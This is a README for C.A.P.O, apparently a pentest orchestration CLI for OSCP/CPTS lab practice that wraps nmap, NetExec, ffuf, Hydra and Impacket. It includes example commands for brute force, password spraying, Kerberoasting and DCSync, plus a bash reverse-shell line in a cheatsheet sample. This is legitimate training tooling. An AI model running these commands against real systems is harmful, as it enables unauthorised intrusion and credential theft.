# C.A.P.O — Context-Aware Pentest Orchestrator

> **Your OSCP/CPTS Exam Companion** — Wraps common pentest tools, tracks every discovery, and suggests the right command at the right time.

```
   ██████╗ ██╗ █████╗ ██████╗  ██████╗
  ██╔════╝ ██║██╔══██╗██╔══██╗██╔═══██╗
  ██║      ██║███████║██████╔╝██║   ██║
  ██║      ██║██╔══██║██╔═══╝ ██║   ██║
  ╚██████╗ ██║██║  ██║██║     ╚██████╔╝
   ╚═════╝ ╚═╝╚═╝  ╚═╝╚═╝      ╚═════╝
```

## Philosophy

- **No Auto-Pwn** — C.A.P.O automates *reconnaissance*, not exploitation. Every command is printed before execution.
- **Exam Compliant** — Built with OSCP/CPTS rules in mind. OSCP mode disables LLM features and restricts tools.
- **State-Aware** — Remembers your discoveries (ports, users, creds, dirs) and suggests next steps.
- **Ready Out-of-the-Box** — Ships with 100+ curated commands from HackTricks, PayloadsAllTheThings, GTFOBins.

---

## How It Works

Everything revolves around **StateManager** — a per-target JSON database that accumulates open ports, users, credentials, hashes, web directories, vhosts, SMB shares, and domain info. Every tool wrapper parses its output and feeds results back into state. Every cheatsheet command pulls variables (`{IP}`, `{DOMAIN}`, `{USER}`, `{PASS}`) from state. The entire tool chain is connected through this shared memory.

```
Run a tool wrapper (scan/nxc/web/brute/kerberos)
  → Wrapper executes tool, parses output
  → StateManager updated (ports, users, creds, etc.)
  → Triggers evaluated → suggestions shown
  → Methodology auto-check marks completed steps
  → Session logs the command
  → Knowledge graph syncs new nodes/edges
  → Cheatsheet commands now inject fresh variables
```

The whole system is a feedback loop: **discover → store → suggest → act → discover more**.

---

## Quick Install

```bash
cd /path/to/capo
pip install -e .

# Optional: AI/LLM features for CPTS mode
pip install -e ".[cpts]"
```

## Quick Start

```bash
# 1. Set your target
capo target set 10.10.10.100 --domain corp.local
capo target campaign my-ad-lab

# 2. Scan
capo scan full                           # quick → detailed → triggers pipeline
capo scan quick                          # all 65535 TCP ports fast
capo scan detailed                       # -sC -sV on open ports

# 3. Enumerate
capo nxc null                            # SMB null session
capo nxc rid-brute                       # RID brute force users
capo web fuzz                            # directory fuzzing
capo web vhost -d corp.local             # vhost discovery

# 4. Attack
capo brute ssh -U users.txt -P passwords.txt
capo kerberos asrep-roast -f users.txt
capo kerberos kerberoast -u svc_tgs -p 'Password1'

# 5. Check progress
capo state show                          # full target summary
capo suggest                             # context-aware next steps
capo methodology ad_kill_chain           # start/resume attack workflow
```

---

## Features

### Target & Campaign Management (`capo target`)

Set a target IP, domain, LHOST for reverse shells. Manually add users, credentials, hashes, domains, vhosts, notes, and flags. Campaigns aggregate users/creds/domain info across multiple hosts in AD labs — switch targets and your campaign loot follows.

```bash
capo target set 10.10.10.100 --domain corp.local
capo target campaign my-ad-lab
capo target add-user svc_sql
capo target add-cred svc_sql 'P@ssword!'
capo target flag local af7b...
capo target note "Potential BOF on port 88"
```

### Tool Wrappers

All wrappers print the command before running, parse output, and auto-update state.

**Scanning** (`capo scan`) — Nmap wrappers for quick (all TCP), detailed (scripts on open ports), UDP, vuln, OS detection, custom scans. Parses XML → updates state with ports/services.

```bash
capo scan quick --profile aggressive     # lab/CTF speed
capo scan detailed                       # -sC -sV on discovered ports
capo scan udp                            # top UDP ports
capo scan vuln                           # safe NSE vuln scripts
capo scan ports 80,443,8080              # targeted port scan
capo scan os                             # OS fingerprinting
capo scan scripts smb-vuln-ms17-010      # specific NSE scripts
capo scan custom --args "-p 80 --script http-enum"
```

**SMB/AD Enumeration** (`capo nxc`) — NetExec wrappers for null/guest sessions, RID brute, password spray, LDAP enumeration, share listing. Extracts users/creds/shares → state.

```bash
capo nxc null                            # null session test
capo nxc guest                           # guest session test
capo nxc rid-brute                       # RID cycling for users
capo nxc ldap-enum                       # LDAP enumeration
capo nxc shares                          # list SMB shares
capo nxc spray -U users.txt -P passwords.txt
capo nxc winrm                           # check WinRM access
```

**Web Enumeration** (`capo web`) — ffuf wrappers for directory fuzzing, vhost discovery, DNS subdomain enumeration. Parses JSON → adds directories/vhosts to state.

```bash
capo web fuzz                            # directory fuzzing
capo web fuzz --host domain -d app.corp.local
capo web vhost -d corp.local             # vhost discovery
capo web subdns -d corp.local            # DNS subdomain enum
capo web recursive --depth 2             # recursive directory scan
```

**Bruteforce** (`capo brute`) — Hydra wrappers for SSH, HTTP POST/GET forms. Found creds → state.

```bash
capo brute ssh -u root -p toor
capo brute ssh -U users.txt -P passwords.txt
capo brute http-post --form '/login.php:username=^USER^&password=^PASS^:F=Invalid' -U users.txt -P passwords.txt
```

**Kerberos & Lateral Movement** (`capo kerberos`) — Impacket command builders for AS-REP roasting, Kerberoasting, secretsdump, DCSync, psexec, wmiexec, smbclient. All support `--dry-run`.

```bash
capo kerberos asrep-roast -f users.txt
capo kerberos kerberoast -u svc_tgs -p 'Password1'
capo kerberos secretsdump -u admin -H <hash>
capo kerberos dcsync -u admin -p pass --dump-user krbtgt
capo kerberos psexec -u Administrator -H <hash>
capo kerberos wmiexec -u admin -p pass
```

### Cheatsheet Engine (`capo search`, `capo tools`)

13 curated YAML cheatsheet databases covering AD, web attacks, privesc, pivoting, shells, password cracking, SMB, impacket, and more. Smart search prioritizes tool matches when the query is a known tool name (e.g., `capo search nmap` shows nmap commands first), then fuzzy results.

Every command template is rendered with current state variables. Commands with `{USER}`/`{PASS}` expand to one per known credential. Custom cheatsheets in `~/.capo/custom_cheatsheets/` override core entries.

```bash
capo search nmap                         # tool-aware: nmap commands first, then related
capo search kerberos                     # fuzzy search across all entries
capo search -c smb                       # list all commands in the SMB category
capo search                              # list all categories
capo search nmap --web                   # also search DuckDuckGo
capo search --tool hydra                 # strict tool-field filter
capo search "asrep roasting" --copy      # copy first result to clipboard
capo tools                               # all tools with cheatsheet coverage counts
capo tools smb                           # filter tools by name
```

### Context-Aware Suggestions (`capo suggest`, `capo triggers`)

27+ port-to-suggestion mappings fire automatically after scans. Contextual logic detects AD environments (3+ AD ports), web frameworks (WordPress → wpscan), and credential+port combos (creds + WinRM open → suggest evil-winrm). Custom triggers via `~/.capo/custom_triggers.yaml`.

```bash
capo suggest                             # all suggestions for current state
capo triggers list                       # show all port triggers
capo triggers check                      # manually evaluate triggers
capo triggers init                       # create custom triggers template
```

### Methodology Workflows (`capo methodology`)

YAML-defined attack playbooks with step-by-step commands, phase labels, and auto-complete conditions. When your state meets a step's requirements (e.g., 10+ hashes found), the step is auto-marked complete.

Available workflows: AD kill chain, ADCS chain, web app assessment, Linux/Windows privesc, web-to-root.

```bash
capo methodology list                    # available workflows
capo methodology ad_kill_chain           # start/resume a workflow
capo methodology ad_kill_chain recon     # show commands for a specific step
capo methodology next ad_kill_chain      # next pending steps
capo methodology done ad_kill_chain recon
capo methodology auto-check              # auto-complete based on state
```

### Session Tracking (`capo session`)

SQLite-backed per-engagement sessions with full command history. Capo wrapper commands are auto-recorded. Enable the shell hook to also capture 100+ external pentest tools (nmap, ffuf, hydra, evil-winrm, etc.):

```bash
# Add to ~/.bashrc or ~/.zshrc for permanent activation
eval "$(capo session hook)"
```

```bash
capo session new Forest 10.10.10.161 --domain htb.local --campaign HTB
capo session show                        # session detail + commands + findings
capo session commands --key --tool nmap  # filter command history
capo session mark 3 --key --finding "AS-REP hash" --category credential --severity high
capo session findings                    # review all findings
capo session use Sauna                   # switch sessions
capo session list                        # overview all sessions
```

### Exam Mode (`capo mode`)

**OSCP mode** disables LLM/AI, restricts tools (sqlmap, metasploit limited to 1 machine, no Burp Pro/Nessus). **CPTS mode** enables all features.

```bash
capo mode oscp                           # strict OSCP mode
capo mode cpts                           # all features enabled
capo mode show                           # current mode and restrictions
capo mode use-msf                        # log metasploit usage (OSCP tracking)
```

| Feature | OSCP Mode | CPTS Mode |
|---------|-----------|-----------|
| Recon Wrappers | Yes | Yes |
| Cheatsheet Engine | Yes | Yes |
| State Management | Yes | Yes |
| Context Suggestions | Yes | Yes |
| LLM/AI Features | No | Yes |
| Metasploit | 1 machine only | Unrestricted |

### Reporting (`capo report`)

Generate Markdown or HTML reports from current state. Timeline view of the attack chain. Terminal preview or file export to `evidence/`.

```bash
capo report                              # generate markdown report
capo report -f html                      # generate HTML report
capo report --preview                    # preview in terminal
capo report --timeline                   # attack timeline only
```

### Writeup Sync (`capo writeup`)

Point capo at folders of Markdown writeups. It parses attack patterns and generates context-aware suggestion rules.

```bash
capo writeup add-source ~/writeups/htb
capo writeup sync                        # parse and generate rules
capo writeup status                      # check generated rule counts
```

### Knowledge Graph (Studio)

Per-target visual relationship graph auto-synced from state. Nodes represent targets, services, users, credentials, domains, directories, and shares. Auto-edges connect related entities. Manual nodes/edges for custom annotations. Drag-to-position in the web UI.

### Studio Web UI (`capo studio`)

Local dashboard at `http://localhost:8000` with views for:
- **Active Engagement** — live target state, ports, creds, users
- **Cheatsheets** — browse and edit cheatsheet YAML files
- **Methodologies** — view and edit methodology workflows
- **Knowledge Graph** — interactive node/edge graph synced from state
- **Sessions** — session management with command history and findings
- **Suggestions** — context-aware next steps

```bash
capo studio
```

### State & Intelligence (`capo state`)

Query and export everything the tool has discovered.

```bash
capo state show                          # full target summary
capo state ports                         # open ports and services
capo state users                         # discovered usernames
capo state creds                         # found credentials
capo state dirs                          # web directories
capo state history                       # scan history
capo state export --format json          # export to JSON/CSV/Markdown
capo state sync-files                    # generate users.txt/passwords.txt
```

---

## Scan Profiles

| Profile | Nmap Rate | Nmap Timing | ffuf Threads | Use Case |
|---------|-----------|-------------|--------------|----------|
| aggressive | 5000 | -T4 | 80 | Lab/CTF |
| normal | 1000 | -T3 | 40 | Default |
| stealth | 300 | -T2 | 10 | Fragile targets |

```bash
capo scan quick --profile aggressive
capo web fuzz --profile stealth
```

---

## Customization

### Custom Cheatsheets

Add YAML files to `~/.capo/custom_cheatsheets/`:

```yaml
category: "my-custom"
description: "My personal commands"
commands:
  - name: "my-revshell"
    description: "My go-to reverse shell"
    command: "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"
    tool: "bash"
    tags: ["shell", "custom"]
    os: "linux"
    exam: ["oscp", "cpts"]
```

Variables auto-injected from state: `{IP}`, `{DOMAIN}`, `{USER}`, `{PASS}`, `{USERFILE}`, `{PASSFILE}`, `{DC_IP}`, `{LHOST}`, `{LPORT}`, `{HOSTNAME}`, `{USERS_FILE}`, `{HASHES_FILE}`.

### Custom Triggers

Add `~/.capo/custom_triggers.yaml` to extend the suggestion engine:

```yaml
8080:
  - description: "Alternate HTTP — try Tomcat manager"
    command: "curl -s http://{IP}:8080/manager/html"
    tags: ["web", "tomcat"]
```

---

## Runtime Data (`~/.capo/`)

```
~/.capo/
├── campaigns/                   # Multi-host engagement contexts
│   └── my-ad-lab/
│       ├── campaign.json        # AD domain, global users & credentials
│       └── loot/                # Global wordlists (users.txt, passwords.txt)
├── workspaces/                  # Per-target workspaces
│   └── 10.10.10.100/
│       ├── state.json           # Target intelligence DB (FileLocked)
│       ├── graph.json           # Knowledge graph nodes/edges
│       ├── notes.md             # Auto-generated report template
│       ├── scans/               # Raw tool outputs (Nmap XML, ffuf JSON)
│       ├── loot/                # Target-specific hashes, SSH keys
│       ├── exploits/            # Downloaded exploits
│       └── evidence/            # Screenshots, proof, reports
├── sessions.db                  # Session logging DB (SQLite)
├── custom_cheatsheets/          # Your personal YAML commands
├── custom_methodologies/        # User-defined workflows
├── custom_triggers.yaml         # User-defined port triggers
├── writeup_rules/               # Generated writeup suggestion rules
└── .current_target              # Last active target
```

---

## REST API

Local REST API (`capo.api:app`) available when Studio is running.

**Core**

| Endpoint | Description |
|---|---|
| `GET /api/engagement/status` | Active target, campaign, and full state |
| `GET /api/state` | Current target/workspace/campaign context |
| `GET /api/suggestions` | Context-aware suggestions for current target |

**Cheatsheets & Methodologies**

| Endpoint | Description |
|---|---|
| `GET /api/cheatsheets` | List all cheatsheet filenames |
| `GET /api/cheatsheets/{file}` | Load a cheatsheet |
| `POST /api/cheatsheets/{file}` | Save edited cheatsheet |
| `GET /api/methodologies` | List all methodology filenames |
| `GET /api/methodologies/{file}` | Load a methodology |
| `POST /api/methodologies/{file}` | Save edited methodology |

**Sessions**

| Endpoint | Description |
|---|---|
| `GET /api/sessions` | List all sessions with stats |
| `POST /api/sessions` | Create + activate a new session |
| `GET /api/sessions/active` | Get active session with summary |
| `POST /api/sessions/{name}/activate` | Switch to a session |
| `GET /api/sessions/{name}` | Session detail + summary |
| `DELETE /api/sessions/{name}` | Delete session and all data |
| `GET /api/sessions/{name}/commands` | List commands |
| `POST /api/sessions/{name}/commands` | Log a manual command |
| `GET /api/sessions/{name}/findings` | List findings |
| `POST /api/sessions/{name}/findings` | Create a finding |

**Knowledge Graph**

| Endpoint | Description |
|---|---|
| `GET /api/graph` | Full knowledge graph (auto-synced from state) |
| `POST /api/graph/nodes` | Create a manual node |
| `PUT /api/graph/nodes/{id}` | Update a node |
| `DELETE /api/graph/nodes/{id}` | Delete a manual node |
| `POST /api/graph/edges` | Create an edge |
| `POST /api/graph/positions` | Bulk update node positions |
| `POST /api/graph/clear` | Clear manual nodes/edges |

**Triggers**

| Endpoint | Description |
|---|---|
| `GET /api/triggers/custom` | Return custom triggers |
| `POST /api/triggers/custom` | Save custom triggers |

---

## Roadmap

- [x] **Phase 1:** Core architecture, State Manager, CLI
- [x] **Phase 2:** Tool wrappers (Nmap, NetExec, ffuf, Hydra), parsers
- [x] **Phase 3:** Cheatsheet Engine, fuzzy search, variable injection
- [ ] **Phase 4:** AI/LLM integration (CPTS mode only)
- [x] **Phase 5:** Field testing on HTB/Proving Grounds

## License

MIT License
